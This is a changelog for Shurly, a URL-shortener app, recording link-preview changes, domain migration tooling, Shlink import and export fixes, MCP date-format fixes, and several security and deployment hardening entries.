# Changelog

All notable changes to Shurly are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## API Versioning Policy

The HTTP API is versioned in the URL path (`/api/v{N}/...`).

- A new major version (`/v2/`) is introduced only when a backwards-incompatible
  change is required.
- The previous version is kept live alongside the new one until all known
  clients have migrated, then announced as deprecated for at least one minor
  release before removal.
- Additive changes (new endpoints, new optional fields) ship under the current
  version without bumping it.
- Breaking changes within a major version are forbidden — if you find one,
  it's a bug.

The OpenAPI/SemVer version of the application (e.g. `0.1.0`) tracks the
implementation lifecycle and is independent of the URL version segment.

---

## [Unreleased]

### Changed — previews from the page (8.7)
- **A link's social preview is its destination's own.** Shurly's preview fields only rewrite it, or add one where the
  page has none. Each link keeps two layers: `og_title`, `og_description` and `og_image_url` hold only what a person
  typed, and the new `page_og_title`, `page_og_description`, `page_og_image_url`, `page_favicon_url` and
  `page_fetched_at` what the page declares (migration 0015). Each field shows the override, else the page's.
- **A social crawler gets the redirect a person gets** (the same status, cache headers, rules and forwarded query,
  and never a campaign recipient's data) when nothing is rewritten, and reads the page's own preview, as it did
  behind Shlink. Shurly's preview page is for a link with an override, each field the override, else the page's.
  Before, a link with nothing stored was shared with no image and its URL as its title. A crawler's visit is still
  not logged.
- **Creating a link fetches the page every time**, overrides or not: a title typed no longer leaves the link without
  the page's image. **refresh-preview** replaces the page's values with what it declares now, and never touches an
  override (before, it only filled empty fields, so it never updated a fetched value). A fetch that fails leaves
  them. **A new destination** is fetched on PATCH.
- **Going back to the page's preview:** PATCH with `og_title`, `og_description` and `og_image_url` null, or empty
  (an empty override is none, on create too). The link's page has **Use the page’s preview**, and the editor's
  **Use the page’s** empties the fields; its **Fetch from page**, which copied the page's values into them, is gone.
  The editor shows the page's values as each empty field's placeholder, and says which fields are yours.
- **The API:** a link adds `page_*` and `has_custom_preview`, and its `og_*` are now the overrides alone (null where
  the page's shows). `og_fetched_at` is deprecated: it gives `page_fetched_at`. `GET …/preview` and refresh-preview
  add `og_title_overridden`, `og_description_overridden`, `og_image_url_overridden` and the page's own values;
  `fetched_at` is when the page was read. A relative `og:image` is resolved against the page. The MCP's tools
  follow, generated from the API.
- **The destination's icon**, from the same fetch: an SVG, then the largest declared PNG `sizes`, then any icon the
  page declares (`rel="icon"`, `shortcut icon`, `apple-touch-icon`), resolved against the URL its redirects ended
  on; else `/favicon.ico` on the link's own origin, then the one the redirects ended on, when one request there,
  through the SSRF guard, answers 200 with an image.
- **The dashboard's thumbnail** shows the preview's image with the icon as a badge in its corner, the icon on a
  neutral tile when there's no image, or the monogram, each image giving way to the next when it fails to load. The
  link page's preview card says, for each part, whether it's yours, the page's or missing. In `/styleguide/` too.
- **`python -m server.tools.previews backfill [--for-real]`** gives the links from before 8.7 their page's preview
  and icon (each distinct destination fetched once, 8 at a time), and clears the old `og_*` values that copy the
  page's, on links whose `og_fetched_at` says they were fetched; the rest stay overrides. Re-runnable.
  **`scripts/run_backfill_previews.sh [--for-real]`** runs it as a one-off ECS task (DEPLOYMENT.md § Previews from
  the page).

### Changed — links.griddo.io redirects to the app (8.6)
- **`links.griddo.io`**, Shlink's web client, redirects (302) to `https://shurly.griddo.io/dashboard/`: ALB rule 11
  is a redirect now. Shlink's web client goes with Shlink at 8.6.
- **The `ecs-alb-rule-sync` Lambda** syncs Shurly's rule alone (`"4": "12"`), and skips a mapped rule that doesn't
  forward. Before, a redirect on a mapped rule would have stopped it before Shurly's rule on every deploy.

### Added — retiring a domain (8.5)
- **`python -m server.tools.domains retire HOST [--for-real]`** deletes a domain's row and its links, with their
  visits, redirect rules and tag associations (campaign links among them), in one transaction. The tags and
  campaigns themselves stay, and so do orphan visits, which record no domain. No redirect is kept.
- **It refuses the default domain**, the row marked so or `DEFAULT_DOMAIN`'s, **and one that isn't there**: it
  exits 1, with nothing written.
- **A dry run unless `--for-real`**: the deletes run and roll back. The report names the links by code, each with
  its visits, redirect rules and tags, and never a destination.
- **`scripts/run_retire_domain.sh HOST [--for-real]`** runs it as a one-off ECS task, like
  `run_promote_domain.sh`, with the domain typed back for real (DEPLOYMENT.md § Retiring a domain). For
  `s.griddo.io`'s row and test links after the cutover.

### Changed — `go.griddo.io` where the interim host was (8.5)
- The defaults that still named the interim short domain name `go.griddo.io`: the frontend deploy's
  `PUBLIC_SHORT_DOMAIN` fallback, `DEFAULT_DOMAIN` in `.env.production.example` and `scripts/deploy_ecs.sh`, and
  `scripts/setup_custom_domain.sh`'s `DOMAIN`. Tests use `go.griddo.io` or a neutral host, the docs the live hosts.

### Fixed — `?nostat` stays with us (8.5)
- **DISABLE_TRACK_PARAM isn't forwarded to the destination any more.** It skipped the visit as it should, but a
  link that forwards its query passed it on too: `go.griddo.io/mcp?nostat` went to YouTube with `&nostat=` on the
  end. Now it's dropped before the query is forwarded, with any value or none (`?nostat`, `?nostat=1`), in the
  redirect, a redirect rule's target and a crawler's preview. Shlink does the same.
- **The rest of the query goes on as it came:** the other parameters in their order, after the destination's own
  query, and a repeated one now with each of its values (`?tag=a&tag=b`), where only the last went before. A
  forwarded parameter still wins a clash with a campaign recipient's row.

### Removed — `users.api_key` (8.5)
- **Migration `0014` drops the plaintext API key column and its unique index** (`ix_users_api_key`). `0007` had
  emptied it, moving every key to its hash, and the release after stopped mapping it; that release is in
  production, so a task still serving the previous release during the rollout never names it. The downgrade adds
  the column back, nullable and indexed as it was, but empty. The drift test no longer ignores anything
  (`_PENDING_DROP` is gone).

### Fixed — the Shlink import without a SAWarning (8.5)
- **The import added a link to the session only after attaching its tags**, so the next new tag's flush saw a tag
  holding a link outside the session: "SAWarning: Object of type <URL> not in session, add operation along
  'Tag.urls' won't proceed". Nothing was lost (every link's tags were
  stored); the link is in the session first now, and the warning is gone.

### Fixed — the Shlink export is whole, or there's none (8.4)
- **Production's export of 344 links held 343 distinct codes**, `co-upb-luis-ochoa` twice, and the import then
  failed on `uq_urls_domain_code` with a traceback. Shlink really holds that link twice: a double submit on the
  default domain, whose NULL `domain_id` its unique key doesn't catch on PostgreSQL.
- **Identical copies Shlink holds collapse to one:** the same destination, title, tags, `meta`, `forwardQuery`,
  `crawlable` and `hasRedirectRules` (`dateCreated` may differ). The export confirms them with Shlink by the
  code (`searchTerm`), asks for their rules and visits once, names them in the snapshot's
  `duplicates_collapsed`, and prints one line. Shlink answers a link's visits for one of its rows only, so each
  copy's visit count is recorded too.
- **Copies that differ stop the export**, naming the link and the fields: someone has to decide which stays,
  and exporting again won't help.
- **The export asks for Shlink's short URLs in code order** (`orderBy=shortCode-ASC`), since Shlink's default
  order isn't stable across pages, **and checks what it brought:** as many links as Shlink's
  `pagination.totalItems`, counted before any collapse, with a count that doesn't change from page to page. A
  link listed more times than Shlink holds it (pages that moved, with another link missing) stops it too.
  A link's visits are asked up to the moment the export started (`endDate`), so a visit made meanwhile can't
  shift their pages, and their count is checked the same way. Anything that doesn't add up stops the export
  with a message and exit status 1, and no snapshot is written. Visits Shlink answers 5xx to are still
  recovered by date range.
- **The review and the import refuse a snapshot that still lists a link twice** (edited by hand, or from an
  older export), naming it, before they write anything (exit status 2), instead of a sheet with two rows for it
  or an IntegrityError. They take a collapsed one, and the import's report names its collapsed links.

### Changed — the MCP and the docs on the app's host only (8.4)
- **The app's own paths answer on its host only:** the MCP (`/mcp`, its 308, `/mcp/…`), its OAuth metadata
  (`/.well-known/oauth-*`), `/docs`, `/redoc` and `/openapi.json`, on the host of `MCP_PUBLIC_URL` (else of
  `FRONTEND_URL`), `shurly.griddo.io` in production. On a short domain, `/mcp`, `/docs` and `/redoc` are codes like
  any other: a redirect and a visit, or an orphan visit and a 404. The `Host` header decides, as the ALB and
  CloudFront pass it; `X-Forwarded-Host` isn't read.
- **A code is reserved only on the app host's domain:** a custom `mcp` on `go.griddo.io` is a link, through the API
  and the MCP, and the Shlink import keeps `go.griddo.io/mcp` (a video, 41 visits). On the app's own domain it's
  still refused.
- **Without `MCP_PUBLIC_URL` or `FRONTEND_URL`** (local development, tests), every host is the app's, as before.
- The README said custom codes were 3-20 characters: 3-64 since `0013`.

### Changed — short codes up to 64 characters (8.4)
- **A short code can be 64 characters long, up from 20.** Shlink's links on `go.griddo.io` run to 44
  (personalized outreach links, out there already), and the import refused the 57 longer than 20. Custom codes
  take up to 64 in the API, the MCP's `create_custom_url` and the create page; generated codes stay 6 characters.
  A code over 64 is still a 400, which now says 64.
- **Migration `0013`** widens `urls.short_code` and `visits.short_code` to VARCHAR(64). PostgreSQL only changes its
  catalog, and the previous release keeps working during the rollout. Its downgrade fails while a code longer
  than 20 is kept. So `users.api_key`'s drop takes `0014`.
- **"Typos & broken links"** looks for paths up to 64 characters, so a typo in a long code is suggested its link
  too.

### Changed — a locked control's tooltip names owners too
- **"Only its creator, or an admin or owner, can change it"**, in the API's words, where it said "Only its creator
  or an admin can change it". The tooltip and what a click on the control says now share one phrase
  (`src/utils/viewer.ts`), and `e2e/member.spec.ts` pins both.
- The member spec hovers a locked control before its forced click, so a menu that's still opening can't take it.

### Added — end-to-end tests as a member
- **The e2e harness signs in a member too:** a second account on the Workspace domain (`e2e.member@griddo.io`),
  which joins as a member through the real sign-in. The fake Google page picks who by a cookie only the harness
  reads (`tests/e2e/identities.py`, pinned by `tests/test_e2e_guard.py`). `e2e/member.setup.ts` saves the session;
  a spec becomes the member with `test.use({ storageState: MEMBER_STATE })`.
- **The organization's logo, as a member:** they see it in Settings and in the account menu, with nothing to change
  it with, and a dropped or picked file sends nothing. axe on a desktop and a phone.
- **The rest of what a member sees** (`e2e/member.spec.ts`):
  - the owner's links and campaigns are locked for them, saying why, and a click sends nothing;
  - their own link they edit and save;
  - tagging in bulk skips the owner's link and says so;
  - the members card has no role menus;
  - the welcome greets them.

  axe on each page, on a desktop and on a phone. A `memberApi` fixture makes what's theirs.
- **The Logo section says who can change it once:** its description no longer repeats the hint's "Owners and admins
  can change it."

### Changed — the frontend's short-link host is a repository variable
- **`PUBLIC_SHORT_DOMAIN`**, the host the app shows before a new link's code, is the repository variable of the
  same name in the frontend deploy, and `s.griddo.io` while it's unset, as before. At the cutover it moves to
  `go.griddo.io` with `gh variable set` and a run of the deploy by hand, with no release (DEPLOYMENT.md § The
  cutover, which also notes there's no `BASE_URL` step: the live service sets none).

### Added — the default domain's switch, for the cutover (8.3)
- **`python -m server.tools.domains promote go.griddo.io`** makes a domain the default: the one new links go on.
  It makes the domain's row if it's missing, marks it the default and unmarks the one that was (`s.griddo.io`),
  in one transaction. A dry run unless `--for-real`, and a second run does nothing. It prints the domains, their
  links and what changes, and says so while `DEFAULT_DOMAIN` still names another domain.
- **In production it runs as a one-off ECS task,** like the import and the backfill:
  `scripts/run_promote_domain.sh go.griddo.io [--for-real]`, which needs the domain typed back. DEPLOYMENT.md
  § The cutover has the runbook for 8.5's window, with `DEFAULT_DOMAIN` and the frontend's `PUBLIC_SHORT_DOMAIN`.
- **What moves with the default, at once:** the domain of new links (the API's, a campaign's, the MCP's), the
  link a code names when the API isn't told the domain, and where a request on a host Shurly doesn't know looks.
- **What doesn't:** a link keeps its domain, so `s.griddo.io`'s keep resolving there. A restart with the old
  `DEFAULT_DOMAIN` keeps the new default, since the row marked default wins at startup. `BASE_URL` still moves
  only `DEFAULT_DOMAIN`'s links.

### Fixed — the Shlink export stopped at the first link whose visits Shlink failed on (8.4)
- **`export --visits` aborted on production's Shlink** with `Shlink answered 500 to
  /rest/v3/short-urls/23q4griddo/visits.`: 12 of the ~91 links with visits answer 500 to their visits, whatever the
  parameters. Shlink's log names the cause: some `visit_locations` rows have a NULL `region_name`, and Shlink 4
  can't serialize a visit with one (`VisitLocation::$regionName must not be accessed before initialization`), so
  any page holding one fails whole. `server/tools/shlink/README.md` has the count and the fix in Shlink's data.
- **The export now carries on:** a 5xx is asked again twice, after 0.5 s and 1 s. If it persists, the link gets
  `visits_error` (status and Shlink's detail), its code goes in the snapshot's `visits_failed`, and its visits are
  recovered by date range: a range that fails is cut in two down to one second, and that second is read one visit
  per page, so only the visit Shlink can't serialize is lost. The ranges lost are the link's `visits_gaps`
  (`{start, end}`, both ends included). A failing list of short URLs, or a 4xx, still stops it.
- **It says what it brought:** the links exported, the links whose visits came whole and how many of those have
  visits, and the codes whose visits failed, with what was recovered and lost.
- **The review and the import carry the gaps on:** the sheet's `visits_export` (`complete`, `recovered`,
  `partial`, `failed`) and `visits_lost` columns; the import brings the recovered visits, never more, and its report
  names each lost range.

### Fixed — MCP tools returned dates without a time zone
- **MCP tools returned dates without a time zone, which claude.ai rejects:** `create_short_url` made the link, and
  then claude.ai threw the whole answer away ("`created_at` does not match format date-time"), so the assistant
  never got the short code; `list_urls`, `get_url` and every other tool with a date in its answer failed the same
  way. A tool's outputSchema comes from the API's OpenAPI schema, which says `"format": "date-time"`, and RFC 3339
  needs an offset there: the API wrote naive UTC, `2026-09-29T22:04:42.082199`. It now writes
  `2026-09-29T22:04:42.082199Z`.
- **The curated tools say it too:** `create_campaign_from_rows`, `add_redirect_rule` and
  `list_orphan_visits_grouped` give their dates in UTC with `Z`, and so does `GET /api/v1/analytics/orphan-visits`.
- **A test calls every MCP tool** through the in-process server on seeded data and validates its answer against its
  outputSchema, date-time checked (`tests/test_mcp_output_dates.py`). Another fails on a response model's datetime
  field that isn't one of the two shared types, `UtcDateTime` or `LocalDateTime` (`server/schemas/datetimes.py`).

### Changed — the API's datetimes carry `Z`
- **Every UTC datetime in the API's JSON now ends in `Z`**: `created_at`, `updated_at`, `joined_at`,
  `og_fetched_at`, `last_click_at`, `valid_since`, `valid_until`, a preview's `fetched_at` and a campaign user's
  `last_clicked`. The same moment as before, which was UTC already, written as RFC 3339 says. It's an additive,
  compatible change to the format: a client that took the old value as UTC reads the same instant, and the web
  app's dates show as they did ("Created Sep 29, 2026").
- **The per-link and per-campaign analytics (3.16, 3.17) are unchanged:** their times are local, with the zone's
  offset (`2026-09-30T03:34:42+05:30`), and never turned into `Z`.
- **What the API accepts is unchanged:** `valid_since` and `valid_until` are read with or without an offset, as
  before. The CSV exports keep their text as it was.

### Added — the organization's logo (3.14.4)
- **Owners and admins upload the organization's logo** in Settings → Organization, preview it and remove it. Every
  member sees it there and in the account menu, next to the organization's name; without one, the name's initial.
- **`PUT`, `GET` and `DELETE /api/v1/organization/logo`**, with the avatar's contract: the image is the request body,
  the GET has an ETag, the `?v=<logo_version>` URL of the current version is immutable in the browser's cache and
  any other is `private, no-cache`, a 404 without one, `nosniff`. A member gets a 403, someone outside the
  organization a 404. `GET /api/v1/organization` gains `logo_version` (additive). None of them is an MCP tool.
- **The avatar's pipeline, shared:** a JPEG, PNG or WebP by its magic bytes (never SVG), 2 MB at most, refused as it
  streams in, 4096 pixels a side, a decompression bomb refused, stored as WebP without metadata. But a logo isn't a
  face: it keeps its shape, fit within 512×512 and never enlarged, and its transparency.
- **Migration `0012`** adds `organizations.logo`, its content type and when it was uploaded: nullable columns
  only. So `users.api_key`'s drop takes `0014` (`0013` is longer short codes, 8.4).
- Each upload and removal writes `org.logo_changed` (who, and which) to the event log.

### Security — only `main` can deploy to production
- **The backend deploy runs in the GitHub environment `production`**, which allows the `main` branch only,
  and the AWS deploy role (`github-actions-shurly-deploy`) trusts that environment alone. Until now the job's
  environment was `dev`, with no rules, and the role trusted `repo:danielserranoh/shurly:*`: a workflow on any
  branch of the repo could assume it. The manual run's dev/staging/prod input is gone.

### Changed — passwords: bcrypt 5, without passlib
- **Passwords are hashed and checked by bcrypt 5 directly.** passlib, unmaintained since 2020, broke on bcrypt 5:
  its bcrypt self-test hashes a 255-byte secret, which bcrypt 5 refuses, so every hash failed (Dependabot's #182,
  which this replaces). The hashes are the same, `$2b$` with 12 rounds, so every stored password still checks.
  Hashes made by the old code are pinned in the tests.
- **A new password can be at most 72 bytes,** what bcrypt reads. Register, set and change answer a 422: "Too long:
  a password can be at most 72 bytes. That's 72 characters of plain text, and fewer with accented letters or
  emoji, which take more than one byte each." Until now the end of a longer password was silently ignored.
- **Settings' new-password hint says it too:** "At least 8 characters · at most 72, fewer with accents or emoji".
  It checks the 8 as you type; the 72 is the API's to check.
- **Signing in still reads a password's first 72 bytes,** as the old code hashed it, so one set longer before
  still works.

### Changed — ruff 0.16
- **ruff 0.16.9,** with its cap raised to `<0.17`. `ruff check` finds nothing new.
- **It also formats the Python code blocks in Markdown files.** That reformatted one block in DEPLOYMENT.md, which
  lost its aligned comments, and the examples in `_pm/IMPLEMENTATION_TAGS.md` and `_pm/IMPLEMENTATION_TASKS.md`. No
  `.py` file changed. It replaces Dependabot's #181, which was red for those three files.

### Changed — CI's actions, a major each, in one PR (Dependabot's first run)
- **checkout v7, setup-python v7, setup-node v7, cache v6, codecov-action v7 and configure-aws-credentials v6.**
  They're mostly the move to the Node 24 runtime, which GitHub's runners have. None of the inputs we pass changed,
  and configure-aws-credentials keeps its OIDC inputs and its `sts.amazonaws.com` audience.
- **codecov's input is `files`:** v7 no longer reads `file` ("Unexpected input(s) 'file'").
- **Dependabot now opens one weekly PR for the actions, majors included,** where its first run opened six
  (#175–#180). Python's majors still come one per PR.

### Changed — what builds the image is pinned too (6.3)
- **The base image and uv are pinned by digest.** The dockerfile names `python:3.11-slim@sha256:…`, which is the
  digest production already runs, and `ghcr.io/astral-sh/uv:0.11.1@sha256:…` in place of `:latest`.
- **The workflows install uv with `astral-sh/setup-uv`, pinned by commit,** in place of piping `astral.sh`'s
  install script into `sh`.
- **One uv reads the lock:** 0.11.1, which wrote it, in CI (`UV_VERSION`) and in the image.
  `tests/test_dependency_lock.py` fails if they part.
- **Dependabot adds the docker ecosystem.** The base image's digest moves weekly, never to a new Python. uv's
  version is left to a deliberate bump, in the dockerfile and both workflows together (DEPLOYMENT.md § Workflow
  trigger).

### Fixed — the one-off tasks find the live task definition on ECS Express
- **`scripts/run_backfill_places.sh` failed in production** at its first dry run: "Unable to describe task
  definition". On an ECS Express service, `describe-services` gives the service's own `taskDefinition` as null,
  and the script asked AWS to describe "null". The Shlink import's runner had the same fault, in the part both
  share (`scripts/one_off_task.sh`).
- **They take the PRIMARY deployment's task definition** (and its network, when the service has none). They stop
  with a clear message while a rollout is in progress, when two deployments exist, rather than run with the
  wrong one.
- **The tests' stand-in for AWS answers as Express does:** a null `taskDefinition` beside the deployments, and
  an error for any task definition but the live one. The earlier stand-in described whatever it was asked for,
  which is how this got through.

### Security — a client could choose its own address on s.griddo.io
- **uvicorn ran with `--proxy-headers --forwarded-allow-ips "*"`.** It trusted every peer, and replaced the
  connection's address with the leftmost `X-Forwarded-For` entry, which the client writes, before the app ran. So
  on the path straight to the ALB (`s.griddo.io`), Phase 6.3's resolution, which reads the header from the right
  and only from `TRUSTED_PROXIES`, saw the forged address as the socket's.
  - The per-IP rate limits could be dodged with a new forged address each time.
  - Visits and orphan visits stored the address the client chose, with its country and city.
  - Found in production by shurly-93 on 2026-09-29: `client_ip_source` read `socket` for `s.griddo.io`.
  - CloudFront's path (`shurly.griddo.io`) wasn't affected: its viewer check reads the address CloudFront
    appended.
- **The image runs uvicorn with `--no-proxy-headers`.** The app alone reads the proxy headers.
  - `X-Forwarded-Proto` now comes from a trusted proxy only (`ForwardedProtoMiddleware`, its rightmost value), so a
    redirect built from the scheme stays `https` behind the ALB.
  - `tests/test_phase63_forwarded_headers.py` runs the real uvicorn with the CMD's flags. A forged
    `X-Forwarded-For` isn't the client, a new one each time is still rate-limited, and the scheme comes only
    from the ALB.
- Visits stored before the fix keep the address they were stored with.

### Changed — dependencies are pinned by a committed uv.lock (6.3)
- **`uv.lock` is committed.** It was gitignored, so every CI run, deploy and Monday rebuild resolved the newest
  versions of 121 packages. A release could ship versions its PR's CI never ran, and the weekly rebuild changed
  production's dependencies with no PR at all.
- **CI and the deploy job run `uv sync --locked`,** which installs exactly the lock and fails when `pyproject.toml`
  changed without it (`uv lock`). The image keeps `uv sync --frozen`, from the same file.
- **New versions arrive in Dependabot's weekly PR against `dev`** (`.github/dependabot.yml`): uv and the
  workflows' actions, with minor and patch bumps grouped, and a major as a PR of its own.
- **The caps stay,** as a safety net under the weekly bump (alembic, google-auth, maxminddb, ruff, fastmcp), with
  their comments reworded.
- **The README and docs/TESTING.md** install with `uv sync --extra dev --extra mcp`: plain `uv sync` leaves out
  pytest and ruff. They also say how to add or bump a dependency.

### Changed — the MCP's sign-in pages are Shurly's, not FastMCP's (5.8)
- **The consent page and every error the MCP sign-in can show are Shurly's.** No FastMCP name or logo, and
  nothing loaded from gofastmcp.com. They come from `server/templates/mcp_consent.html` and `mcp_error.html`.
  - fastmcp still runs the flow: the CSRF token, the cookies and the redirect checks.
  - `mcp_server/pages.py` points its four page renderers at ours, when the Google provider is built.
- **An error page shows a reason from a fixed set, never text from the request.** fastmcp's callback page put
  the URL's `error_description` on screen, so a crafted link could show anyone's words under our domain.
- **An exception from the token exchange with Google isn't shown any more.** The page gives a generic reason,
  and `mcp.sign_in_error` logs a scrubbed line. Every error page logs its `page` and `reason`.
- **Every HTML page under `/mcp` gets headers.** A CSP allowing only the templates' styles, by hash;
  `X-Frame-Options: DENY`, `no-store`, `no-referrer`, `nosniff` and `noindex`.
  - Before, the callback's errors had no `X-Frame-Options`, and no page had a cache or referrer policy.
  - No `form-action`, on purpose: it would break the redirects that end at Claude.
- **A fastmcp upgrade can't bring FastMCP's pages back unnoticed.** `tests/test_phase58_mcp_pages.py` pins
  what the pages must keep: the client's name, the verified domain, the exact callback, the form and its
  fields, Allow and Deny, consent every time. The app refuses to start if a renderer moved.

### Added — cities on the Location tab (8.4)
- **A link's and a campaign's By location tab lists cities,** next to the countries, as a chart and a table. A city
  shows with its country ("Valencia, Spain"), since two Valencias are two places. Other cities, then Unknown, come
  last, whatever their counts.
- **A campaign's says what Other cities is:** those fewer than 5 recipients clicked from, grouped so that no one's
  city shows. A campaign link's page has no cities, as the API gives it none.
- **The credit is MaxMind's alone:** the cities come from GeoLite2 City. DB-IP, credited under the countries, has
  no cities.
- **The manual's "Read your analytics"** says what a city is, where the visitor's connection is registered, and a
  campaign's rule.

### Changed — the landing's example is Griddo's proposal for Tufts University
- **The hero's link carries Griddo's logo,** the white "G" on navy (`public/logos/logo-griddo-g-s-w.svg`), in place
  of the lettered tile.
- **Acme Corp is Tufts University** across the landing's mocks: the hero's card, its short link (`…/q4-tufts`),
  the tags, Ana's company, the link preview (tufts.edu, "Undergraduate admissions") and the custom back-half
  (`…/tufts-proposal`). Northwind and Globex stay.
- The hero's card is padded like the page's gutter on phones, so `s.griddo.io/q4-tufts` fits at 390px.
- **The login page's feed** tells the same story: "Tufts University opened “Q4 proposal”".

### Added — each request's log line says how its client IP was found (6.3)
- **`http.request` lines carry `client_ip_source` and `host`.** The source is `cloudfront` (the viewer address, on a
  request with the distribution's secret), `xff` (`X-Forwarded-For`, from a trusted proxy) or `socket` (the
  connection's peer). The IP itself is never logged.
- **So production can show the rate limits count people, not CloudFront's edges.** `shurly.griddo.io` should read
  `cloudfront` only, and `s.griddo.io` `xff`. DEPLOYMENT.md § Client IPs behind CloudFront has the query, and what
  each other answer means.
- `client_ip_and_source` (`server/utils/network.py`) decides both. `client_ip`, which the rate limits and the visit
  log use, is unchanged.
- DEPLOYMENT's first-deploy check no longer claims that 21 failed logins show the IP is yours. From one client they
  can't, since CloudFront reuses its connections. The source can.

### Added — a visit's city, in the breakdowns (8.4)
- **A visit's city is stored** (`visits.city`, migration `0011`): its English name, from GeoLite2 City, looked up
  from the stored, anonymized address like its country. Nothing else about the place: no region, postcode or
  coordinates.
- **A link's and a campaign's breakdowns list `cities`**, each with its country's ISO code, and "Unknown" (country
  null) for the visits without one. A city only ever goes out counted:
  - A campaign link's breakdown has `"cities": null`, since its visits are one named recipient's.
  - A campaign's names a city only when its visits in the period came from at least 5 of its links. The rest are
    summed as "Other cities". Otherwise a day on which one recipient clicked would name their city.
  - `/visits` and its CSV have no city.
- **The Shlink import brings `visitLocation.cityName`,** and never the coordinates.
- **`python -m server.tools.backfill_places`** fills in older visits' empty countries and cities from their stored
  address. It fills only what's empty, and a city only where the country agrees.
  - In production, `scripts/run_backfill_places.sh` runs it as a one-off ECS task, a dry run first.
  - It and the Shlink import's runner share `scripts/one_off_task.sh`.
- **Migration numbers:** `0011` is the city, `0012` the organization's logo (3.14.4) and `0013` longer short codes
  (8.4), so `users.api_key`'s drop takes `0014`.

### Added — GeoLite2 City in the image, kept within MaxMind's 30 days (8.4)
- **The image carries MaxMind's GeoLite2 City**, the data for a visit's city, which comes next. A visit's country
  now comes from it too. DB-IP's country database stays as the fallback (`GEOIP_FALLBACK_DATABASE`), and the
  image grows by about 65 MB.
- **It's fetched with MaxMind's account ID and licence key,** the GitHub secrets `MAXMIND_ACCOUNT_ID` and
  `MAXMIND_LICENSE_KEY`, which the deploy job hands to the build as BuildKit secrets. They're in no image layer,
  build argument or log line. The key goes to MaxMind only, never to the storage MaxMind's download redirects to.
- **The deploy runs every Monday at 05:00 UTC,** rebuilding main's current commit: MaxMind's licence wants a copy
  replaced within 30 days of an update. One deploy runs at a time, so a push during the weekly run waits.
- **It's checked at every step.**
  - The download must match MaxMind's SHA-256, place 8.8.8.8 in the US and be under 25 days old.
  - The deploy fails, and deploys nothing, when the key is set but GeoLite2 City wasn't fetched.
  - The app logs what it opened and its age (`geo.database_opened`), why it fell back to DB-IP, and
    `geo.database_stale` past 25 days.
- **`/api/v1/health` reports its `build`,** the deploy run that made the image. The smoke test waits for it as well
  as the commit, because the weekly image has the same commit as the one it replaces.
- **ECR's lifecycle rule** that expires images older than 30 days, and so their copies of GeoLite2, is in
  DEPLOYMENT.md § Geolocation data, to apply by hand.
- **Credits:** `NOTICE`, the README and the countries card credit MaxMind's GeoLite data and DB-IP.

### Fixed — the image has its country database again (a hotfix, 8.4)
- **The release's image shipped without DB-IP's country database.** The build got a 403 for this month's file
  and for last month's, because download.db-ip.com refuses Python's default User-Agent. Visits saved since then
  have no country, and the deploy job warned: "No geolocation data".
- **`scripts/fetch_geoip.py` now asks with its own User-Agent,** `shurly-fetch-geoip/1`. The tests' stand-in for
  DB-IP refuses Python's agent, as the real one does.
- The visits saved without a country keep none until the one-off backfill that comes with cities (8.4) fills it
  in from their stored address.

### Added — the Shlink import runs as a one-off ECS task (decision B)
- **`scripts/run_shlink_import.sh`** runs `python -m server.tools.shlink import` in production's network, against
  the private RDS, from the live service's own image, environment and network. It makes the task definition for
  the run and deletes it at the end, whatever happened.
- **The snapshot and the review come from a private S3 bucket.** An AWS CLI container copies them into a volume the
  import reads, using a task role that reads one prefix. The app's image stays as it is.
- **It's a dry run unless `--for-real`,** which asks for the owner's email typed back. Its output goes to the
  service's CloudWatch log group, and the script prints it.
- **The service's secrets,** in the environment it carries over, go to AWS and never to the terminal.
- **DEPLOYMENT.md has the runbook,** and the bucket and the IAM to make once by hand.
  `tests/test_run_shlink_import.py` runs the script against a fake `aws`.

### Changed — two privacy questions, answered for now
- **A campaign link's visits one by one, and orphan visits' IPs,** are both kept as they are (2026-09-29), to revisit
  after the dogfood. `docs/PERSONAL_DATA.md` says so where it said "decision pending".

### Added — Send feedback (the dogfood, 5.6.1)
- **Send feedback, in the account menu and the phone's menu**, opens an email to support@griddo.io in the person's
  own mail app, with the subject "Shurly feedback" and, below room to write, the page they were on: its path, built
  when the page is, so never its query (a link's code or a campaign's id).

### Added — CI runs the whole suite on PostgreSQL too
- **The suite ran on in-memory SQLite,** which takes what PostgreSQL refuses. The recent 500s only production could
  give hid there: a `GROUP BY` on a `json` column, a NUL character in text. CI's PostgreSQL service ran only the
  migration and PostgreSQL tests.
- **A new job, `test-postgres`, runs all of it on PostgreSQL,** in parallel with the SQLite one, and the summary
  waits for both.
  - `TEST_SUITE_ON_POSTGRES=1`, with `TEST_DATABASE_URL`, gives the run a database of its own, one per process.
  - That database is dropped when the run ends, however it ended.
  - SQLite stays the default locally: it's faster.
- **A trial run found nothing else hiding:** every test passed on PostgreSQL. The test that makes an insert fail now
  does it with a trigger in each dialect.
- `tests/test_suite_database.py` checks the suite runs on the database it was asked for, so the job can't quietly
  run on SQLite.

### Added — how people join, get their roles and leave (a runbook, 7.2)
- **`DEPLOYMENT.md` § People: joining, roles and leaving**, for the rollout to the team (5.6.1): what to set before
  anyone joins; that anyone on the Workspace domain who has the address can sign in, and what Google has to vouch
  for; what members, admins and owners can do; what removing someone closes and what happens to their links; and
  the rollout, step by step. Each statement is checked against the code.

### Fixed — a visit stores at most 1024 characters of user agent and 2048 of referrer
- **The columns take any length,** so a scanner could store tens of KB of header on every hit, up to what the
  load balancer lets through. Real user agents and referrers are a few hundred characters.
- **Now a visit keeps the first 1024 characters of its user agent and the first 2048 of its referrer.** That's
  clicks, email opens, orphan visits and the Shlink import alike.
- **Only what's stored is cut.** Bot detection and the redirect rules read the whole header first, so no visit is
  told apart differently.
- **The breakdown parses the stored user agent.** A real one keeps its families once cut, padding and all. Only a
  user agent whose telling words all come after its first 1024 characters would parse differently there, and its
  bot flag was set from the whole of it.
- No migration: the columns stay as they are, and rows already stored keep their headers.

### Added — browser errors reach the logs (6.4, for the dogfood)
- **The web app reports what breaks in a person's browser**: an uncaught error, a rejected promise, or a
  Content-Security-Policy or Trusted Types block, which a `<meta>` policy can't report by itself. Each goes to
  `POST /api/v1/client-errors`, which logs one `client.error` line next to the API's own.
- **What a report holds:** the message (500 characters at most, on one line, without any URL's query or fragment),
  the script and where in it, and the page's path, never its query. The account's id when signed in; never an IP.
  Not form values or storage.
- **Bounded:** five a page load, each once; the API takes anyone's, signed in or not, and limits them per IP
  (`RATE_LIMIT_CLIENT_ERRORS_PER_IP`, 30 a minute). A report can't forge a log line: the event log is JSON.
